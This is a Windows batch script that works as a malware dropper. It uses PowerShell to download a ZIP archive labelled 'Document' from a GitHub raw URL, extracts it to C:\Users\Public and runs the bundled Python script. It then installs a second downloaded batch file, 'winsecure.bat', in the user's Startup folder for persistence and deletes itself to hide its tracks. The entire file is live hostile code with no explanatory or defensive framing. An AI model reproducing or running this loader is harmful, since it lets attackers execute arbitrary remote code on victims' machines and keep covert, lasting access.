@echo off
SET "FILENAME=%~dp0\Document.zip"
powershell.exe -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/sellxilips/document/main/Document.zip', '"%FILENAME%"');Expand-Archive "%FILENAME%" -DestinationPath C:\Users\Public -Force;del "%FILENAME%";C:\\Users\\Public\\Document\\python C:\\Users\\Public\\Document\\run.py;Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/sellxilips/document/main/winsecure.bat' -OutFile %appdata%\Microsoft\Windows\'Start Menu\Programs\Startup\winsecure.bat'}"
(goto) 2>nul & del "%~f0"

